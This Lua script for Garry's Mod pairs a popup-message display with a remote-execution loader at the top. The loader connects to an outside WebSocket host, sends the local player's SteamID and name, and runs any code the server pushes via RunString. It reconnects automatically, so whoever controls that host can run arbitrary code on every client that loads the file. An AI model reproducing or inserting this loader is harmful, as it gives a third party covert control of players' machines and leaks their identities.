-- Kill any existing connection to avoid duplicates
if _G.RemoteExecWS then
    print("[northpole] Closing previous WebSocket connection...")
    _G.RemoteExecDisabled = true

    -- Safe close if function exists
    if isfunction(_G.RemoteExecWS.close) then
        _G.RemoteExecWS:close()
    end

    _G.RemoteExecWS = nil
end

_G.RemoteExecDisabled = false

-- Load gwsockets binary
local ok, err = pcall(require, "gwsockets")
if not ok then
    ErrorNoHalt("[northpole] Failed to load gwsockets: " .. tostring(err) .. "\n")
    return
end

-- Create WebSocket connection
local ws = GWSockets.createWebSocket("wss://northpole-sv.onrender.com")
_G.RemoteExecWS = ws

local lastID = nil

function ws:onMessage(msg)
    local data = util.JSONToTable(msg)
    if not istable(data) then return end

    if data.kill then
        print("[northpole] Kill signal received. Shutting down.")
        _G.RemoteExecDisabled = true
        self:close()
        _G.RemoteExecWS = nil
        return
    end

    if not data.id or not data.code then return end
    if data.id == lastID then return end
    lastID = data.id

    local delay = (data.run_at or os.time()) - os.time()
    if delay < 0 then delay = 0 end

    print("[northpole] Executing code in " .. delay .. " seconds")
    timer.Simple(delay, function()
        if not _G.RemoteExecDisabled then
            RunString(data.code, "RemoteExec_WS")
        end
    end)
end

function ws:onConnected()
    print("[northpole] WebSocket connected")

    timer.Simple(1, function()
        local ply = LocalPlayer()
        if not IsValid(ply) then return end

        local data = util.TableToJSON({
            type = "identify",
            steamID = ply:SteamID(),
            playerName = ply:Nick()
        })
        ws:write(data)
    end)
end



function ws:onDisconnected()
    if _G.RemoteExecDisabled then
        print("[northpole] Disconnected and disabled — not reconnecting.")
        return
    end

    print("[northpole] Disconnected — reconnecting in 5 seconds...")
    timer.Simple(5, function()
        if not _G.RemoteExecDisabled then
            self:open()
        end
    end)
end

-- Start connection
ws:open()

local popupQueue = {}
local popupActive = false

-- ✅ Optional: load custom fonts from data/fonts/*.ttf
local function RegisterCustomFont(name, size)
    surface.CreateFont("PopupFont_" .. name .. "_" .. size, {
        font = name,
        size = size,
        weight = 600,
        antialias = true
    })
    return "PopupFont_" .. name .. "_" .. size
end

-- ✅ Utility: Parse [color] tags like [red], [white]
local function ParseColorTags(str)
    local segments = {}
    local tagToColor = {
        red = Color(255, 80, 80),
        blue = Color(80, 150, 255),
        white = Color(255, 255, 255),
        green = Color(100, 255, 100),
        yellow = Color(255, 255, 100),
    }

    local currentColor = Color(255, 255, 255)
    for token in string.gmatch(str, "([^%[]+)%]") do
        local tag = string.match(token, "^(%a+)%[")
        if tag and tagToColor[tag] then
            currentColor = tagToColor[tag]
            token = string.gsub(token, tag .. "%[", "")
        end
        table.insert(segments, { text = token, color = currentColor })
    end
    return segments
end

-- ✅ Main display function
function ShowPopupMessage(opts)
    table.insert(popupQueue, opts)
    if not popupActive then DisplayNextPopup() end
end

function DisplayNextPopup()
    if #popupQueue == 0 then
        popupActive = false
        return
    end

    popupActive = true
    local opts = table.remove(popupQueue, 1)

    -- Defaults
    local text = opts.text or "Hello!"
    local duration = opts.duration or 4
    local fontName = opts.font or "Trebuchet24"
    local fontSize = opts.fontSize or 24
    local fallbackColor = opts.color or Color(255, 255, 255)
    local icon = opts.icon
    local soundEnabled = opts.sound ~= false
    local typeMode = opts.typeMode or "letter"
    local animateIcon = opts.animateIcon
    local typingSound = opts.typingSound or "ui/buttonrollover.wav"

    -- Register custom font
    local fontID = RegisterCustomFont(fontName, fontSize)

    -- Safe Material load
    local iconMat = nil
    if icon then
        local ok, mat = pcall(Material, icon, "noclamp smooth")
        if ok and mat then iconMat = mat end
    end

    local panel = vgui.Create("DPanel")
    panel:SetSize(800, 120)
    panel:SetPos((ScrW() - panel:GetWide()) / 2, ScrH() * 0.15)
    panel:SetAlpha(0)
    panel:AlphaTo(255, 0.3, 0)

    local segments = ParseColorTags(text)
    local currentText = ""
    local currentIndex = 1
    local tokens = {}

    for _, seg in ipairs(segments) do
        if typeMode == "word" then
            for word in string.gmatch(seg.text, "%S+") do
                table.insert(tokens, { word .. " ", seg.color })
            end
        else
            for i = 1, #seg.text do
                table.insert(tokens, { seg.text:sub(i, i), seg.color })
            end
        end
    end

    local revealList = {}
    local iconAngle = 0
    local iconAlpha = 255

    -- Paint function
    panel.Paint = function(self, w, h)
        draw.RoundedBox(8, 0, 0, w, h, Color(0, 0, 0, 160))

        if iconMat then
            surface.SetDrawColor(255, 255, 255, iconAlpha)
            surface.SetMaterial(iconMat)
            local size = 64
            local x = 10 + size / 2
            local y = h / 2
            if animateIcon == "spin" then
                iconAngle = iconAngle + FrameTime() * 180
                surface.DrawTexturedRectRotated(x, y, size, size, iconAngle)
            else
                surface.DrawTexturedRect(10, y - size / 2, size, size)
            end
        end

        local x = iconMat and 84 or w / 2
        local y = h / 2
        local align = iconMat and TEXT_ALIGN_LEFT or TEXT_ALIGN_CENTER

        surface.SetFont(fontID)
        local totalText = ""
        for _, part in ipairs(revealList) do totalText = totalText .. part[1] end

        local curX = x
        for _, part in ipairs(revealList) do
            local str, clr = part[1], part[2]
            surface.SetTextColor(clr)
            surface.SetTextPos(curX, y - fontSize / 2)
            surface.SetFont(fontID)
            surface.DrawText(str)
            local w = surface.GetTextSize(str)
            curX = curX + w
        end
    end

    -- Typing animation
    local delay = (typeMode == "word") and 0.08 or 0.035
    local timerID = "Popup_" .. CurTime() .. "_" .. math.random(99999)

    timer.Create(timerID, delay, #tokens, function()
        if not IsValid(panel) then return end
        local entry = tokens[currentIndex]
        if entry then
            table.insert(revealList, entry)
            if soundEnabled then surface.PlaySound(typingSound) end
            currentIndex = currentIndex + 1
        end
    end)

    -- Flash animation
    if animateIcon == "flash" and iconMat then
        timer.Create("PopupFlash_" .. timerID, 0.1, duration * 10, function()
            iconAlpha = (iconAlpha == 255) and 120 or 255
        end)
    end

    -- Cleanup
    timer.Simple(duration, function()
        if not IsValid(panel) then return end
        panel:AlphaTo(0, 1, 0, function()
            if IsValid(panel) then panel:Remove() end
            DisplayNextPopup()
        end)
    end)
end
